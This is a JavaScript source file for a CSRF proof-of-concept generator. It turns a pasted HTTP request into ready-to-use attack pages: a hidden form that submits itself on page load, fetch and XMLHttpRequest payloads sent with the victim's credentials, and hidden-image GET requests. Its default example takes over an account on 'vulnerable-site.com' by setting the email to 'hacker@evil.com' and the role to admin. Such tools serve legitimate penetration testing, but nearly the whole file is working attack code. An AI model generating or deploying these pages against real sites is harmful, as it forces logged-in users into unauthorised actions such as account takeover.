// Application Data
const appData = {
  templates: [
    {
      name: "User Profile Update",
      request: "POST /api/user/profile HTTP/1.1\nHost: example.com\nContent-Type: application/json\nContent-Length: 54\n\n{\"name\":\"John Doe\",\"email\":\"john@example.com\"}"
    },
    {
      name: "Password Change",
      request: "POST /change-password HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 33\n\nold_password=123&new_password=456"
    },
    {
      name: "Admin Panel Access",
      request: "POST /admin/users HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 24\n\naction=delete&user_id=123"
    },
    {
      name: "File Upload",
      request: "POST /upload HTTP/1.1\nHost: example.com\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Length: 196\n\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"file\"; filename=\"test.txt\"\nContent-Type: text/plain\n\ntest content\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
    }
  ],
  history: [],
  currentRequest: null
};

// Matrix Rain Animation
class MatrixRain {
  constructor() {
    this.canvas = document.getElementById('matrix-canvas');
    this.ctx = this.canvas.getContext('2d');
    this.chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-=[]{}|;:,.<>?'.split('');
    this.drops = [];
    this.fontSize = 14;
    this.columns = 0;
    
    this.resizeCanvas();
    this.initDrops();
    this.animate();
    
    window.addEventListener('resize', () => this.resizeCanvas());
  }
  
  resizeCanvas() {
    this.canvas.width = window.innerWidth;
    this.canvas.height = window.innerHeight;
    this.columns = Math.floor(this.canvas.width / this.fontSize);
    this.initDrops();
  }
  
  initDrops() {
    this.drops = [];
    for (let i = 0; i < this.columns; i++) {
      this.drops[i] = Math.random() * this.canvas.height / this.fontSize;
    }
  }
  
  animate() {
    this.ctx.fillStyle = 'rgba(10, 10, 10, 0.05)';
    this.ctx.fillRect(0, 0, this.canvas.width, this.canvas.height);
    
    this.ctx.fillStyle = '#00ff41';
    this.ctx.font = `${this.fontSize}px monospace`;
    
    for (let i = 0; i < this.drops.length; i++) {
      const text = this.chars[Math.floor(Math.random() * this.chars.length)];
      this.ctx.fillText(text, i * this.fontSize, this.drops[i] * this.fontSize);
      
      if (this.drops[i] * this.fontSize > this.canvas.height && Math.random() > 0.975) {
        this.drops[i] = 0;
      }
      this.drops[i]++;
    }
    
    requestAnimationFrame(() => this.animate());
  }
}

// HTTP Request Parser
class RequestParser {
  static parse(rawRequest) {
    try {
      const lines = rawRequest.trim().split('\n');
      if (lines.length === 0) throw new Error('Empty request');
      
      // Parse request line
      const requestLine = lines[0].trim();
      const [method, path, protocol] = requestLine.split(/\s+/);
      
      if (!method || !path) {
        throw new Error('Invalid request line format');
      }
      
      // Parse headers
      const headers = {};
      let bodyStartIndex = 1;
      
      for (let i = 1; i < lines.length; i++) {
        const line = lines[i].trim();
        if (line === '') {
          bodyStartIndex = i + 1;
          break;
        }
        
        const colonIndex = line.indexOf(':');
        if (colonIndex > 0) {
          const headerName = line.substring(0, colonIndex).trim().toLowerCase();
          const headerValue = line.substring(colonIndex + 1).trim();
          headers[headerName] = headerValue;
        }
      }
      
      // Parse body
      const body = lines.slice(bodyStartIndex).join('\n').trim();
      
      // Extract host
      const host = headers['host'] || 'example.com';
      
      // Validate required fields
      if (!host) {
        throw new Error('Host header is required');
      }
      
      return {
        method: method.toUpperCase(),
        path,
        protocol: protocol || 'HTTP/1.1',
        headers,
        body,
        host,
        contentType: headers['content-type'] || 'application/x-www-form-urlencoded'
      };
    } catch (error) {
      throw new Error(`Failed to parse request: ${error.message}`);
    }
  }
  
  static validate(request) {
    const errors = [];
    const warnings = [];
    
    if (!request.method) errors.push('Method is required');
    if (!request.path) errors.push('Path is required');
    if (!request.host) errors.push('Host is required');
    
    if (request.method === 'POST' || request.method === 'PUT' || request.method === 'PATCH') {
      if (!request.body && !request.headers['content-length']) {
        warnings.push('POST/PUT/PATCH requests typically have a body');
      }
    }
    
    if (request.body && !request.headers['content-type']) {
      warnings.push('Content-Type header recommended when body is present');
    }
    
    return { errors, warnings, isValid: errors.length === 0 };
  }
}

// PoC Generators
class PoCGenerator {
  static generateHTMLForm(request, protocol = 'https') {
    const action = `${protocol}://${request.host}${request.path.split('?')[0]}`;
    const method = request.method.toLowerCase();
    
    let inputs = '';
    
    if (method === 'get' && request.path.includes('?')) {
      const params = new URLSearchParams(request.path.split('?')[1]);
      inputs = Array.from(params.entries())
        .map(([key, value]) => `    <input type="hidden" name="${this.escapeHtml(key)}" value="${this.escapeHtml(value)}">`)
        .join('\n');
    } else if (request.body) {
      inputs = this.parseBodyToInputs(request.body, request.contentType);
    }
    
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF PoC - HTML Form</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: #f0f0f0; 
            padding: 20px; 
        }
        .csrf-form { 
            max-width: 500px; 
            margin: 0 auto; 
            background: white; 
            padding: 20px; 
            border-radius: 8px; 
            box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
        }
        .csrf-form h1 { 
            color: #333; 
            margin-bottom: 20px; 
        }
        .csrf-form button { 
            background: #007cba; 
            color: white; 
            padding: 12px 24px; 
            border: none; 
            border-radius: 4px; 
            cursor: pointer; 
            font-size: 16px; 
        }
        .csrf-form button:hover { 
            background: #005a85; 
        }
    </style>
</head>
<body>
    <div class="csrf-form">
        <h1>CSRF Proof of Concept</h1>
        <p>Click the button below to execute the CSRF attack:</p>
        <form method="${method}" action="${action}">
${inputs}
            <button type="submit">Execute Request</button>
        </form>
    </div>
</body>
</html>`;
  }
  
  static generateAutoSubmitForm(request, protocol = 'https') {
    const action = `${protocol}://${request.host}${request.path.split('?')[0]}`;
    const method = request.method.toLowerCase();
    
    let inputs = '';
    
    if (method === 'get' && request.path.includes('?')) {
      const params = new URLSearchParams(request.path.split('?')[1]);
      inputs = Array.from(params.entries())
        .map(([key, value]) => `    <input type="hidden" name="${this.escapeHtml(key)}" value="${this.escapeHtml(value)}">`)
        .join('\n');
    } else if (request.body) {
      inputs = this.parseBodyToInputs(request.body, request.contentType);
    }
    
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF PoC - Auto Submit</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: #f0f0f0; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .loading { 
            text-align: center; 
        }
        .spinner { 
            border: 4px solid #f3f3f3; 
            border-top: 4px solid #3498db; 
            border-radius: 50%; 
            width: 40px; 
            height: 40px; 
            animation: spin 1s linear infinite; 
            margin: 0 auto 20px; 
        }
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }
    </style>
</head>
<body>
    <div class="loading">
        <div class="spinner"></div>
        <h2>Executing CSRF Attack...</h2>
        <p>Please wait while the request is being processed.</p>
    </div>
    
    <form id="csrfForm" method="${method}" action="${action}" style="display: none;">
${inputs}
    </form>
    
    <script>
        // Auto-submit the form when page loads
        window.onload = function() {
            setTimeout(function() {
                document.getElementById('csrfForm').submit();
            }, 2000); // 2 second delay for dramatic effect
        };
    </script>
</body>
</html>`;
  }
  
  static generateJSFetch(request, protocol = 'https') {
    const url = `${protocol}://${request.host}${request.path}`;
    const method = request.method;
    
    let bodyCode = '';
    let headersCode = '';
    
    if (request.body) {
      if (request.contentType.includes('application/json')) {
        bodyCode = `body: ${JSON.stringify(request.body)},`;
      } else if (request.contentType.includes('application/x-www-form-urlencoded')) {
        bodyCode = `body: '${this.escapeJs(request.body)}',`;
      } else {
        bodyCode = `body: ${JSON.stringify(request.body)},`;
      }
    }
    
    if (request.contentType) {
      headersCode = `headers: {
        'Content-Type': '${request.contentType}'
    },`;
    }
    
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF PoC - Fetch API</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: #f0f0f0; 
            padding: 20px; 
        }
        .csrf-container { 
            max-width: 600px; 
            margin: 0 auto; 
            background: white; 
            padding: 20px; 
            border-radius: 8px; 
            box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
        }
        .csrf-container h1 { 
            color: #333; 
        }
        .csrf-container button { 
            background: #28a745; 
            color: white; 
            padding: 12px 24px; 
            border: none; 
            border-radius: 4px; 
            cursor: pointer; 
            font-size: 16px; 
            margin-right: 10px; 
        }
        .csrf-container button:hover { 
            background: #218838; 
        }
        #result { 
            margin-top: 20px; 
            padding: 15px; 
            background: #f8f9fa; 
            border-radius: 4px; 
            border-left: 4px solid #007cba; 
        }
        .error { 
            border-left-color: #dc3545 !important; 
            background: #f8d7da !important; 
        }
    </style>
</head>
<body>
    <div class="csrf-container">
        <h1>CSRF PoC - Fetch API</h1>
        <p>Click the button below to execute the CSRF attack using modern fetch API:</p>
        
        <button onclick="executeFetch()">Execute with Fetch</button>
        <button onclick="executeWithCredentials()">Execute with Credentials</button>
        
        <div id="result" style="display: none;"></div>
    </div>
    
    <script>
        async function executeFetch() {
            const resultDiv = document.getElementById('result');
            resultDiv.style.display = 'block';
            resultDiv.className = '';
            resultDiv.innerHTML = 'Executing request...';
            
            try {
                const response = await fetch('${url}', {
                    method: '${method}',
                    ${headersCode}
                    ${bodyCode}
                    mode: 'no-cors'
                });
                
                resultDiv.innerHTML = 'Request executed! Check the server logs or network tab for results.';
            } catch (error) {
                resultDiv.className = 'error';
                resultDiv.innerHTML = 'Error: ' + error.message;
            }
        }
        
        async function executeWithCredentials() {
            const resultDiv = document.getElementById('result');
            resultDiv.style.display = 'block';
            resultDiv.className = '';
            resultDiv.innerHTML = 'Executing request with credentials...';
            
            try {
                const response = await fetch('${url}', {
                    method: '${method}',
                    ${headersCode}
                    ${bodyCode}
                    credentials: 'include',
                    mode: 'cors'
                });
                
                resultDiv.innerHTML = 'Request with credentials executed! Status: ' + response.status;
            } catch (error) {
                resultDiv.className = 'error';
                resultDiv.innerHTML = 'Error: ' + error.message;
            }
        }
        
        // Auto-execute on page load (optional)
        // window.onload = () => executeFetch();
    </script>
</body>
</html>`;
  }
  
  static generateXHR(request, protocol = 'https') {
    const url = `${protocol}://${request.host}${request.path}`;
    const method = request.method;
    
    let bodyCode = request.body ? `xhr.send('${this.escapeJs(request.body)}');` : 'xhr.send();';
    let setHeaderCode = '';
    
    if (request.contentType && request.body) {
      setHeaderCode = `xhr.setRequestHeader('Content-Type', '${request.contentType}');`;
    }
    
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF PoC - XMLHttpRequest</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: #f0f0f0; 
            padding: 20px; 
        }
        .csrf-container { 
            max-width: 600px; 
            margin: 0 auto; 
            background: white; 
            padding: 20px; 
            border-radius: 8px; 
            box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
        }
        .csrf-container h1 { 
            color: #333; 
        }
        .csrf-container button { 
            background: #fd7e14; 
            color: white; 
            padding: 12px 24px; 
            border: none; 
            border-radius: 4px; 
            cursor: pointer; 
            font-size: 16px; 
            margin-right: 10px; 
        }
        .csrf-container button:hover { 
            background: #e8660c; 
        }
        #result { 
            margin-top: 20px; 
            padding: 15px; 
            background: #f8f9fa; 
            border-radius: 4px; 
            border-left: 4px solid #fd7e14; 
        }
        .error { 
            border-left-color: #dc3545 !important; 
            background: #f8d7da !important; 
        }
    </style>
</head>
<body>
    <div class="csrf-container">
        <h1>CSRF PoC - XMLHttpRequest</h1>
        <p>Click the button below to execute the CSRF attack using XMLHttpRequest:</p>
        
        <button onclick="executeXHR()">Execute XHR</button>
        <button onclick="executeWithCredentials()">Execute with Credentials</button>
        
        <div id="result" style="display: none;"></div>
    </div>
    
    <script>
        function executeXHR() {
            const resultDiv = document.getElementById('result');
            resultDiv.style.display = 'block';
            resultDiv.className = '';
            resultDiv.innerHTML = 'Executing XMLHttpRequest...';
            
            const xhr = new XMLHttpRequest();
            xhr.open('${method}', '${url}', true);
            ${setHeaderCode}
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status >= 200 && xhr.status < 300) {
                        resultDiv.innerHTML = 'Request successful! Status: ' + xhr.status + '<br>Response: ' + xhr.responseText.substring(0, 200) + '...';
                    } else {
                        resultDiv.innerHTML = 'Request completed with status: ' + xhr.status;
                    }
                }
            };
            
            xhr.onerror = function() {
                resultDiv.className = 'error';
                resultDiv.innerHTML = 'Request failed due to network error';
            };
            
            ${bodyCode}
        }
        
        function executeWithCredentials() {
            const resultDiv = document.getElementById('result');
            resultDiv.style.display = 'block';
            resultDiv.className = '';
            resultDiv.innerHTML = 'Executing XMLHttpRequest with credentials...';
            
            const xhr = new XMLHttpRequest();
            xhr.open('${method}', '${url}', true);
            xhr.withCredentials = true;
            ${setHeaderCode}
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    resultDiv.innerHTML = 'Request with credentials completed! Status: ' + xhr.status;
                }
            };
            
            xhr.onerror = function() {
                resultDiv.className = 'error';
                resultDiv.innerHTML = 'Request failed - possibly blocked by CORS';
            };
            
            ${bodyCode}
        }
        
        // Auto-execute on page load (optional)
        // window.onload = () => executeXHR();
    </script>
</body>
</html>`;
  }
  
  static generateImageGET(request, protocol = 'https') {
    if (request.method.toUpperCase() !== 'GET') {
      return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF PoC - Image Method Not Supported</title>
</head>
<body>
    <h1>Error</h1>
    <p>Image-based CSRF attacks only work with GET requests.</p>
    <p>The provided request uses ${request.method} method.</p>
</body>
</html>`;
    }
    
    const url = `${protocol}://${request.host}${request.path}`;
    
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF PoC - Image GET</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: #f0f0f0; 
            padding: 20px; 
        }
        .csrf-container { 
            max-width: 600px; 
            margin: 0 auto; 
            background: white; 
            padding: 20px; 
            border-radius: 8px; 
            box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
        }
        .csrf-container h1 { 
            color: #333; 
        }
        .csrf-container button { 
            background: #6f42c1; 
            color: white; 
            padding: 12px 24px; 
            border: none; 
            border-radius: 4px; 
            cursor: pointer; 
            font-size: 16px; 
        }
        .csrf-container button:hover { 
            background: #5a32a3; 
        }
        #result { 
            margin-top: 20px; 
            padding: 15px; 
            background: #f8f9fa; 
            border-radius: 4px; 
            border-left: 4px solid #6f42c1; 
        }
        .hidden-images { 
            position: absolute; 
            left: -9999px; 
            top: -9999px; 
        }
    </style>
</head>
<body>
    <div class="csrf-container">
        <h1>CSRF PoC - Image GET Request</h1>
        <p>This PoC uses image src attributes to trigger GET requests:</p>
        
        <button onclick="executeImageAttack()">Execute Image Attack</button>
        <button onclick="executeAutoLoad()">Auto-load on Page Load</button>
        
        <div id="result" style="display: none;"></div>
        
        <!-- Hidden images for the attack -->
        <div class="hidden-images" id="hiddenImages"></div>
    </div>
    
    <script>
        function executeImageAttack() {
            const resultDiv = document.getElementById('result');
            resultDiv.style.display = 'block';
            resultDiv.innerHTML = 'Executing image-based CSRF attack...';
            
            const img = new Image();
            img.onload = function() {
                resultDiv.innerHTML = 'Image request completed successfully!';
            };
            img.onerror = function() {
                resultDiv.innerHTML = 'Image request completed (error expected for non-image responses)';
            };
            img.src = '${url}?' + new Date().getTime(); // Add timestamp to prevent caching
        }
        
        function executeAutoLoad() {
            const resultDiv = document.getElementById('result');
            const hiddenDiv = document.getElementById('hiddenImages');
            
            resultDiv.style.display = 'block';
            resultDiv.innerHTML = 'Auto-loading image requests...';
            
            // Create multiple hidden images for repeated requests
            for (let i = 0; i < 3; i++) {
                setTimeout(() => {
                    const img = document.createElement('img');
                    img.src = '${url}?' + new Date().getTime() + '&attempt=' + i;
                    img.style.display = 'none';
                    hiddenDiv.appendChild(img);
                    
                    if (i === 2) {
                        resultDiv.innerHTML = 'Multiple image requests completed!';
                    }
                }, i * 1000);
            }
        }
        
        // Auto-execute on page load
        window.onload = function() {
            // Uncomment the line below to auto-execute
            // executeImageAttack();
        };
    </script>
</body>
</html>`;
  }
  
  static parseBodyToInputs(body, contentType) {
    if (contentType.includes('application/x-www-form-urlencoded')) {
      const params = new URLSearchParams(body);
      return Array.from(params.entries())
        .map(([key, value]) => `    <input type="hidden" name="${this.escapeHtml(key)}" value="${this.escapeHtml(value)}">`)
        .join('\n');
    } else if (contentType.includes('application/json')) {
      try {
        const jsonData = JSON.parse(body);
        return Object.entries(jsonData)
          .map(([key, value]) => `    <input type="hidden" name="${this.escapeHtml(key)}" value="${this.escapeHtml(String(value))}">`)
          .join('\n');
      } catch (e) {
        return `    <!-- JSON body could not be parsed into form inputs -->
    <input type="hidden" name="json_data" value="${this.escapeHtml(body)}">`;
      }
    } else {
      return `    <!-- Raw body data -->
    <input type="hidden" name="raw_data" value="${this.escapeHtml(body)}">`;
    }
  }
  
  static escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  }
  
  static escapeJs(text) {
    return text.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"');
  }
}

// Notification System
class NotificationManager {
  static show(message, type = 'info', duration = 5000) {
    const container = document.getElementById('notifications');
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.textContent = message;
    
    container.appendChild(notification);
    
    setTimeout(() => {
      notification.remove();
    }, duration);
  }
  
  static success(message) {
    this.show(message, 'success');
  }
  
  static error(message) {
    this.show(message, 'error');
  }
  
  static warning(message) {
    this.show(message, 'warning');
  }
}

// Main Application Class
class CSRFPoCApp {
  constructor() {
    this.currentTab = 'html-form';
    this.matrix = null;
    this.init();
  }
  
  init() {
    this.initMatrix();
    this.initEventListeners();
    this.loadTemplates();
    this.loadHistory();
    this.setDefaultRequest();
    this.initKeyboardShortcuts();
    this.updateStatus('Application loaded successfully');
  }
  
  initMatrix() {
    this.matrix = new MatrixRain();
  }
  
  initEventListeners() {
    // Input textarea events
    const textarea = document.getElementById('request-input');
    textarea.addEventListener('input', () => this.onInputChange());
    textarea.addEventListener('paste', () => {
      setTimeout(() => this.onInputChange(), 100);
    });
    
    // Button events
    document.getElementById('generate-btn').addEventListener('click', () => this.generatePoCs());
    document.getElementById('validate-btn').addEventListener('click', () => this.validateRequest());
    document.getElementById('clear-btn').addEventListener('click', () => this.clearInput());
    document.getElementById('save-template-btn').addEventListener('click', () => this.saveTemplate());
    document.getElementById('copy-all-btn').addEventListener('click', () => this.copyAllPoCs());
    document.getElementById('download-all-btn').addEventListener('click', () => this.downloadAllPoCs());
    
    // Template selector
    document.getElementById('template-selector').addEventListener('change', (e) => {
      if (e.target.value) {
        this.loadTemplate(e.target.value);
      }
    });
    
    // Tab switching
    document.querySelectorAll('.tab-btn').forEach(btn => {
      btn.addEventListener('click', (e) => {
        this.switchTab(e.target.dataset.tab);
      });
    });
    
    // FAB help button
    document.getElementById('fab-help').addEventListener('click', () => {
      this.showHelpModal();
    });
  }
  
  initKeyboardShortcuts() {
    document.addEventListener('keydown', (e) => {
      if (e.ctrlKey || e.metaKey) {
        switch (e.key) {
          case 'Enter':
            e.preventDefault();
            this.generatePoCs();
            break;
          case 'k':
            e.preventDefault();
            this.clearInput();
            break;
          case 's':
            e.preventDefault();
            this.saveTemplate();
            break;
        }
      }
    });
  }
  
  onInputChange() {
    const textarea = document.getElementById('request-input');
    const charCount = document.getElementById('char-count');
    const validationStatus = document.getElementById('validation-status');
    
    charCount.textContent = `${textarea.value.length} chars`;
    
    if (textarea.value.trim()) {
      try {
        const parsed = RequestParser.parse(textarea.value);
        const validation = RequestParser.validate(parsed);
        
        if (validation.isValid) {
          validationStatus.textContent = 'Valid';
          validationStatus.className = 'status-indicator valid';
        } else {
          validationStatus.textContent = 'Invalid';
          validationStatus.className = 'status-indicator invalid';
        }
      } catch (error) {
        validationStatus.textContent = 'Invalid';
        validationStatus.className = 'status-indicator invalid';
      }
    } else {
      validationStatus.textContent = 'Ready';
      validationStatus.className = 'status-indicator';
    }
  }
  
  validateRequest() {
    const textarea = document.getElementById('request-input');
    const input = textarea.value.trim();
    
    if (!input) {
      NotificationManager.warning('Please enter an HTTP request to validate');
      return;
    }
    
    try {
      const parsed = RequestParser.parse(input);
      const validation = RequestParser.validate(parsed);
      
      if (validation.isValid) {
        NotificationManager.success('Request is valid and ready for PoC generation');
        if (validation.warnings.length > 0) {
          validation.warnings.forEach(warning => {
            NotificationManager.warning(warning);
          });
        }
      } else {
        NotificationManager.error('Request validation failed');
        validation.errors.forEach(error => {
          NotificationManager.error(error);
        });
      }
    } catch (error) {
      NotificationManager.error(`Validation error: ${error.message}`);
    }
  }
  
  generatePoCs() {
    const textarea = document.getElementById('request-input');
    const input = textarea.value.trim();
    
    if (!input) {
      NotificationManager.warning('Please enter an HTTP request first');
      return;
    }
    
    this.showLoading();
    
    setTimeout(() => {
      try {
        const request = RequestParser.parse(input);
        const protocol = document.querySelector('input[name="protocol"]:checked').value;
        
        // Generate all PoC types
        const htmlForm = PoCGenerator.generateHTMLForm(request, protocol);
        const autoForm = PoCGenerator.generateAutoSubmitForm(request, protocol);
        const jsFetch = PoCGenerator.generateJSFetch(request, protocol);
        const xhr = PoCGenerator.generateXHR(request, protocol);
        const imgGet = PoCGenerator.generateImageGET(request, protocol);
        
        // Update output sections
        document.getElementById('html-form-code').textContent = htmlForm;
        document.getElementById('auto-form-code').textContent = autoForm;
        document.getElementById('js-fetch-code').textContent = jsFetch;
        document.getElementById('xhr-code').textContent = xhr;
        document.getElementById('img-get-code').textContent = imgGet;
        
        // Save to history
        this.addToHistory(input);
        
        // Update current request
        appData.currentRequest = request;
        
        this.hideLoading();
        NotificationManager.success('PoC generated successfully for all types');
        this.updateStatus('PoC generation completed');
        
      } catch (error) {
        this.hideLoading();
        NotificationManager.error(`Generation failed: ${error.message}`);
        this.updateStatus('PoC generation failed');
      }
    }, 1000);
  }
  
  switchTab(tabId) {
    // Update tab buttons
    document.querySelectorAll('.tab-btn').forEach(btn => {
      btn.classList.remove('active');
    });
    document.querySelector(`[data-tab="${tabId}"]`).classList.add('active');
    
    // Update tab content
    document.querySelectorAll('.tab-content').forEach(content => {
      content.classList.remove('active');
    });
    document.getElementById(tabId).classList.add('active');
    
    this.currentTab = tabId;
  }
  
  clearInput() {
    document.getElementById('request-input').value = '';
    document.getElementById('template-selector').value = '';
    this.onInputChange();
    NotificationManager.success('Input cleared');
  }
  
  saveTemplate() {
    const textarea = document.getElementById('request-input');
    const input = textarea.value.trim();
    
    if (!input) {
      NotificationManager.warning('Please enter a request to save as template');
      return;
    }
    
    const name = prompt('Enter template name:');
    if (name) {
      appData.templates.push({ name, request: input });
      this.loadTemplates();
      NotificationManager.success(`Template "${name}" saved successfully`);
    }
  }
  
  loadTemplate(templateName) {
    const template = appData.templates.find(t => t.name === templateName);
    if (template) {
      document.getElementById('request-input').value = template.request;
      this.onInputChange();
      NotificationManager.success(`Template "${templateName}" loaded`);
    }
  }
  
  loadTemplates() {
    const selector = document.getElementById('template-selector');
    const quickTemplates = document.getElementById('quick-templates');
    
    // Update selector
    selector.innerHTML = '<option value="">Select Template</option>';
    appData.templates.forEach(template => {
      const option = document.createElement('option');
      option.value = template.name;
      option.textContent = template.name;
      selector.appendChild(option);
    });
    
    // Update quick templates in sidebar
    quickTemplates.innerHTML = '';
    appData.templates.forEach(template => {
      const item = document.createElement('div');
      item.className = 'template-item';
      item.textContent = template.name;
      item.addEventListener('click', () => this.loadTemplate(template.name));
      quickTemplates.appendChild(item);
    });
  }
  
  addToHistory(request) {
    const timestamp = new Date().toLocaleString();
    appData.history.unshift({ request, timestamp });
    
    // Keep only last 10 entries
    if (appData.history.length > 10) {
      appData.history = appData.history.slice(0, 10);
    }
    
    this.loadHistory();
  }
  
  loadHistory() {
    const historyContainer = document.getElementById('request-history');
    historyContainer.innerHTML = '';
    
    appData.history.forEach((entry, index) => {
      const item = document.createElement('div');
      item.className = 'history-item';
      
      const preview = entry.request.split('\n')[0];
      const shortPreview = preview.length > 40 ? preview.substring(0, 40) + '...' : preview;
      
      item.innerHTML = `
        <div style="font-weight: 600; margin-bottom: 4px;">${shortPreview}</div>
        <div style="font-size: 0.7rem; color: rgba(0, 255, 65, 0.6);">${entry.timestamp}</div>
      `;
      
      item.addEventListener('click', () => {
        document.getElementById('request-input').value = entry.request;
        this.onInputChange();
        NotificationManager.success('Request loaded from history');
      });
      
      historyContainer.appendChild(item);
    });
  }
  
  setDefaultRequest() {
    const defaultRequest = `POST /update-profile HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

username=admin&email=hacker@evil.com&role=admin`;
    
    document.getElementById('request-input').value = defaultRequest;
    this.onInputChange();
  }
  
  showLoading() {
    document.getElementById('loading-overlay').classList.remove('hidden');
  }
  
  hideLoading() {
    document.getElementById('loading-overlay').classList.add('hidden');
  }
  
  updateStatus(message) {
    document.getElementById('app-status').textContent = message;
  }
  
  showHelpModal() {
    const helpContent = `
CSRF PoC Generator - Help & Keyboard Shortcuts

Keyboard Shortcuts:
• Ctrl+Enter: Generate PoC
• Ctrl+K: Clear input
• Ctrl+S: Save as template

Supported Request Types:
• GET, POST, PUT, DELETE, PATCH
• application/x-www-form-urlencoded
• application/json
• multipart/form-data
• text/plain

PoC Types:
• HTML Form: Classic form submission
• Auto-Submit: Automatically submits on page load
• JavaScript Fetch: Modern fetch API
• XMLHttpRequest: Traditional AJAX
• Image GET: GET requests via image src

Tips:
• Always include the Host header
• Use proper Content-Type headers
• Test in a controlled environment
• Use for educational purposes only
    `;
    
    alert(helpContent);
  }
  
  copyAllPoCs() {
    const currentCode = document.querySelector('.tab-content.active .code-block').textContent;
    navigator.clipboard.writeText(currentCode).then(() => {
      NotificationManager.success('Current PoC copied to clipboard');
    });
  }
  
  downloadAllPoCs() {
    const zip = {
      'csrf-html-form.html': document.getElementById('html-form-code').textContent,
      'csrf-auto-submit.html': document.getElementById('auto-form-code').textContent,
      'csrf-js-fetch.html': document.getElementById('js-fetch-code').textContent,
      'csrf-xhr.html': document.getElementById('xhr-code').textContent,
      'csrf-image-get.html': document.getElementById('img-get-code').textContent
    };
    
    // Create a simple download for the current PoC
    const currentCode = document.querySelector('.tab-content.active .code-block').textContent;
    const filename = `csrf-poc-${this.currentTab}-${Date.now()}.html`;
    
    const blob = new Blob([currentCode], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);
    
    NotificationManager.success('PoC downloaded successfully');
  }
}

// Global functions for inline event handlers
function copyContent(elementId) {
  const content = document.getElementById(elementId).textContent;
  navigator.clipboard.writeText(content).then(() => {
    NotificationManager.success('Content copied to clipboard');
  });
}

function downloadContent(elementId, filename) {
  const content = document.getElementById(elementId).textContent;
  const blob = new Blob([content], { type: 'text/html' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename || `csrf-poc-${Date.now()}.html`;
  a.click();
  URL.revokeObjectURL(url);
  NotificationManager.success('File downloaded successfully');
}

// Initialize application when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
  window.csrfApp = new CSRFPoCApp();
});